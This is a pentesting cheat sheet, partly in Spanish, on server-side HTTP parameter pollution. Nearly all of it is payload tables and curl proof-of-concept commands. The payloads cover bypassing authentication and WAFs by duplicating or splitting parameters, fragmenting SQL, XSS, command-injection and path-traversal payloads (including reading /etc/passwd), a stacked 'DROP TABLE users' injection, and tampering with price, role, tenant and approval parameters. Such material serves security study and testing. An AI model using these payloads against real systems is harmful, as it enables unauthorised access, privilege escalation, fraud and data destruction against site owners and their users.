---
aliases:
  - Server-Side HPP
  - WAF Bypass HPP
  - HPP SQLi
tags:
  - type/cheatsheet
  - vuln/hpp
  - technique/initial-access
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Parameter Pollution]]'
---
# HPP - Server-Side

***

## Auth / Access Control Bypass

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Differential parser confusion | Frontend WAF reads first param, backend reads second → bypass | Standard. |
| Auth check on first param | `?user=admin&user=victim` — auth checks `admin`, action on `victim` | Bypass. |
| Permission tied to first | First param validated, second processed | Direct. |
| Admin endpoint dual params | `?action=read&action=delete` — auth on read, exec delete | Privesc. |
| Proxy normalizes, app processes | Proxy sees one, app sees both | Differential. |
| Header-based vs query-based | Param en header validated, en URL processed | Source confusion. |
| Cookie validation vs query | Cookie auth check, query param ignored | Edge. |
| Combine con verb tampering | POST con duplicate GET param | Multi-vector. |
| Combine con method override | `_method=DELETE` con multiple values | Compound. |
| GraphQL field aliasing analog | Multi-aliased same field | GraphQL adjacent. |
| OAuth state confusion | Multiple `state=` values en authz request | Federation chain. |
^hpp-server-auth

### PoC auth bypass via HPP

```bash
# Backend: 
#   if user == 'admin': require_super_auth()
#   else: do_action(user)

# Atacante: PHP backend (last value wins)
curl "https://target/admin/action?user=admin&user=attacker"
# Frontend WAF: sees user=admin, blocks. NOT applied per behavior.
# Or: WAF checks first 'admin' (allowlisted), backend uses 'attacker' (last) → action as attacker.
```

___

## WAF / Filter Bypass via Param Split

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | WAF inspects param value. If value split via duplicate param + concatenation, WAF misses pattern. | ASP.NET specific. |
| ASP.NET concat | `?q=SELECT&q=*&q=FROM&q=users` → backend gets `SELECT,*,FROM,users` | SQL fragments. |
| WAF only inspects first | `?q=safe&q=<malicious>` | Direct bypass. |
| WAF only inspects last | `?q=<malicious>&q=safe` | Same. |
| Concat with comma | If backend uses concatenated value en query | SQLi via fragments. |
| XSS payload split | `?q=<scr&q=ipt>alert(1)</scr&q=ipt>` | Fragmented. |
| Command injection split | `?cmd=ls&cmd=;&cmd=cat&cmd=/etc/passwd` | Fragmented. |
| Path traversal split | `?file=..&file=/&file=etc&file=passwd` | Fragmented. |
| Combine con encoding | `?q=%3C&q=script%3E` | Multi-encoding bypass. |
| Bypass content-length checks | Smaller individual values | Edge. |
| Combine con HRS | Smuggle with multi-param request | Compound. |
| WAF rule order | Some WAFs only check first match | Per-WAF. |
^hpp-server-waf

### PoC WAF bypass

```bash
# Stack: ASP.NET (concatenates duplicates with comma)

# Without HPP — blocked by WAF
curl 'https://target/search?q=SELECT * FROM users'
# WAF blocks: SQL injection signature

# With HPP — split into fragments
curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'
# Each individual param value benign
# ASP.NET concatenates: "SELECT,*,FROM,users"
# Backend receives, executes as SQL
# WAF sees individual benign params, no signature match → bypass
```

___

## Logic Flow Manipulation

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| State machine confusion | `?step=1&step=3` → skip step 2 | Skip flow. |
| Multi-step purchase | `?action=add&action=checkout` | Skip approval. |
| Approval workflow | `?status=pending&status=approved` | Bypass review. |
| Voting / rating | `?vote=up&vote=up` con app que dedupes by source | Edge. |
| Discount / coupon | `?coupon=A&coupon=B` apply both | Multi-coupon. |
| Quantity manipulation | `?qty=1&qty=100` | Stock bypass. |
| Price manipulation | `?price=100&price=1` | If editable. |
| Combine con Mass Assignment | Mass assign via duplicate field | Compound. |
| Form field injection | Multi-field con same name | Edge. |
| Email change | `?email=victim&email=attacker` | ATO chain. |
| Role parameter | `?role=user&role=admin` | Privesc. |
| Tenant ID manipulation | `?tenant=A&tenant=B` cross-tenant | Multi-tenant escape. |
^hpp-server-logic

___

## SQLi en Hidden Param via Concatenation

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| ASP.NET concat | `?id=1&id=' UNION SELECT * FROM users -- ` | Backend receives `1,' UNION SELECT...`. |
| Escape single quote | If first param contains escape, second injects | Edge. |
| Combine sqlmap | `sqlmap --hpp` flag | Built-in. |
| Java getParameterValues con concatenation logic | If app concats array | Edge. |
| Custom backend logic | If app loops over param values en query | Per-app. |
| Bypass single-quote filter | Combine quotes en split params | Encoding combo. |
| Bypass length filter | Multiple smaller params | Bypass. |
| Combine con stacked queries | `?id=1&id=;DROP TABLE users` | Multi-statement. |
| LDAP injection adjacent | LDAP filter con HPP | Adjacent. |
| NoSQL filter bypass | Mongoose query con duplicate | Adjacent. |
| GraphQL aliasing | Same effect en mutations | Adjacent. |
^hpp-server-sqli

___

## Mass Assignment Combo

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Body con duplicate field | `name=test&isAdmin=false&isAdmin=true` | If last wins → admin. |
| Override sensitive field | First "safe" value, second "evil" value | Direct. |
| Combine con framework param parsing | Per-framework behavior decides | Stack-aware. |
| Form-encoded vs JSON | Different parsers behave differently | Multi-source. |
| GraphQL input duplicate | `mutation { update(input: {name:"x", role:"user", role:"admin"}) }` | GraphQL. |
| Combine con field whitelist bypass | Whitelist on first, exec on last | Standard. |
| Multipart form duplicate | Multiple form-data fields | Edge. |
| Combine con array notation | `roles[]=user&roles[]=admin` | Type confusion. |
| Combine con type juggling | Different types for same field | Edge. |
| Per-stack behavior | Test which value persisted | Per-app. |
^hpp-server-mass-assign

***
